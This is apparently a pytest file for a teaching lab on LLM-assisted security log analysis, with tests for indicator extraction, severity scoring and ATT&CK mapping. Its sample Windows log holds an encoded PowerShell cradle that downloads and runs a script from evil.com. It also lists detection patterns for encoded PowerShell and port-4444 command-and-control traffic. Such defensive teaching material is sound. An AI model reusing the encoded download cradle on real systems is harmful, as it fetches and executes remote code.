#!/usr/bin/env python3
"""Tests for Lab 04: LLM-Powered Security Log Analysis."""

import pytest

# =============================================================================
# Sample Log Data for Testing
# =============================================================================

SAMPLE_WINDOWS_LOG = """
Event ID: 4688 - A new process has been created.
Time: 2025-01-07T14:30:22Z
User: CORP\\admin
Process: powershell.exe
CommandLine: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwAnACkA
Parent Process: cmd.exe
"""

SAMPLE_SYSLOG = """
Jan 7 14:35:00 webserver nginx: 185.143.223.47 - - [07/Jan/2025:14:35:00 +0000] "POST /wp-login.php HTTP/1.1" 200 4523 "-" "Mozilla/5.0"
Jan 7 14:35:01 webserver nginx: 185.143.223.47 - - [07/Jan/2025:14:35:01 +0000] "POST /wp-login.php HTTP/1.1" 200 4523 "-" "Mozilla/5.0"
Jan 7 14:35:02 webserver nginx: 185.143.223.47 - - [07/Jan/2025:14:35:02 +0000] "POST /wp-login.php HTTP/1.1" 200 4523 "-" "Mozilla/5.0"
"""

SAMPLE_FIREWALL_LOG = """
timestamp=2025-01-07T14:40:15Z action=deny src_ip=10.0.1.50 dst_ip=185.143.223.47 dst_port=4444 protocol=TCP bytes=1024
timestamp=2025-01-07T14:40:16Z action=deny src_ip=10.0.1.50 dst_ip=185.143.223.47 dst_port=4444 protocol=TCP bytes=1024
timestamp=2025-01-07T14:40:17Z action=deny src_ip=10.0.1.50 dst_ip=185.143.223.47 dst_port=4444 protocol=TCP bytes=1024
"""


# =============================================================================
# Log Parsing Tests
# =============================================================================


class TestLogParsing:
    """Test log parsing functionality."""

    def test_detect_windows_log_format(self):
        """Test detection of Windows event log format."""
        indicators = ["Event ID:", "Process:", "CommandLine:"]
        assert all(ind in SAMPLE_WINDOWS_LOG for ind in indicators)

    def test_detect_syslog_format(self):
        """Test detection of syslog format."""
        assert "nginx:" in SAMPLE_SYSLOG
        assert "HTTP/1.1" in SAMPLE_SYSLOG

    def test_detect_firewall_format(self):
        """Test detection of firewall log format."""
        assert "action=deny" in SAMPLE_FIREWALL_LOG
        assert "dst_port=" in SAMPLE_FIREWALL_LOG


# =============================================================================
# IOC Extraction Tests
# =============================================================================


class TestIOCExtraction:
    """Test IOC extraction patterns."""

    def test_extract_ip_addresses(self):
        """Test IP address extraction."""
        import re

        ip_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
        ips = re.findall(ip_pattern, SAMPLE_FIREWALL_LOG)

        assert len(ips) > 0
        assert "185.143.223.47" in ips

    def test_extract_encoded_command(self):
        """Test encoded command detection."""
        # Base64 encoded PowerShell pattern
        assert "-enc" in SAMPLE_WINDOWS_LOG

    def test_extract_urls(self):
        """Test URL extraction from logs."""
        assert "/wp-login.php" in SAMPLE_SYSLOG

    def test_extract_ports(self):
        """Test port extraction."""
        assert "4444" in SAMPLE_FIREWALL_LOG  # Common C2 port


# =============================================================================
# Severity Assessment Tests
# =============================================================================


class TestSeverityAssessment:
    """Test severity scoring logic."""

    def test_high_severity_indicators(self):
        """Test detection of high severity patterns."""
        high_severity_patterns = [
            "powershell",
            "-enc",
            "cmd.exe",
            "4444",  # Meterpreter default port
        ]

        combined_logs = SAMPLE_WINDOWS_LOG + SAMPLE_FIREWALL_LOG
        matches = sum(1 for p in high_severity_patterns if p.lower() in combined_logs.lower())

        assert matches >= 2  # Multiple high-severity indicators

    def test_brute_force_detection(self):
        """Test brute force pattern detection."""
        # Multiple login attempts to same endpoint
        login_count = SAMPLE_SYSLOG.count("/wp-login.php")
        assert login_count >= 3  # Brute force indicator


# =============================================================================
# MITRE ATT&CK Mapping Tests
# =============================================================================


class TestMITREMapping:
    """Test MITRE ATT&CK technique mapping."""

    def test_powershell_execution_technique(self):
        """Test T1059.001 - PowerShell detection."""
        # Encoded PowerShell in command line
        assert "powershell.exe" in SAMPLE_WINDOWS_LOG.lower()
        assert "-enc" in SAMPLE_WINDOWS_LOG

    def test_c2_communication_technique(self):
        """Test T1071 - Application Layer Protocol C2."""
        # Repeated connections to suspicious port
        assert "4444" in SAMPLE_FIREWALL_LOG
        assert "deny" in SAMPLE_FIREWALL_LOG


# =============================================================================
# Report Generation Tests
# =============================================================================


class TestReportGeneration:
    """Test incident report components."""

    def test_report_should_have_summary(self):
        """Test that report structure includes summary."""
        required_sections = [
            "summary",
            "findings",
            "iocs",
            "recommendations",
        ]

        # This is a structural test - actual implementation should generate these
        sample_report = {
            "summary": "Potential compromise detected",
            "findings": ["Encoded PowerShell execution"],
            "iocs": ["185.143.223.47"],
            "recommendations": ["Block IP at firewall"],
        }

        for section in required_sections:
            assert section in sample_report

    def test_timeline_generation(self):
        """Test timeline entry structure."""
        timeline_entry = {
            "timestamp": "2025-01-07T14:30:22Z",
            "event": "Process creation",
            "details": "PowerShell with encoded command",
            "severity": "high",
        }

        assert "timestamp" in timeline_entry
        assert "severity" in timeline_entry


# =============================================================================
# Integration Tests
# =============================================================================


class TestIntegration:
    """Test full analysis pipeline."""

    def test_combined_log_analysis(self):
        """Test analysis of combined log sources."""
        all_logs = SAMPLE_WINDOWS_LOG + SAMPLE_SYSLOG + SAMPLE_FIREWALL_LOG

        # Should be able to identify multiple threat patterns
        threat_indicators = 0

        if "powershell" in all_logs.lower():
            threat_indicators += 1
        if "-enc" in all_logs:
            threat_indicators += 1
        if "4444" in all_logs:
            threat_indicators += 1
        if all_logs.count("wp-login") >= 3:
            threat_indicators += 1

        assert threat_indicators >= 3  # Multiple correlated indicators


# =============================================================================
# Prompt Template Tests
# =============================================================================


class TestPromptTemplates:
    """Test prompt template structure."""

    def test_system_prompt_structure(self):
        """Test that system prompt has required elements."""
        # A good security analysis system prompt should mention:
        required_elements = [
            "security",
            "analyst",
            "logs",
            "ioc",
        ]

        sample_prompt = """You are a security analyst expert at analyzing logs.
        Your task is to identify IOCs and suspicious patterns."""

        prompt_lower = sample_prompt.lower()
        for element in required_elements:
            assert element in prompt_lower

    def test_structured_output_format(self):
        """Test structured output format specification."""
        expected_fields = ["severity", "findings", "iocs", "techniques"]

        # Structured output should include these fields
        sample_output = {
            "severity": "high",
            "findings": ["Encoded PowerShell"],
            "iocs": ["185.143.223.47"],
            "techniques": ["T1059.001"],
        }

        for field in expected_fields:
            assert field in sample_output


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
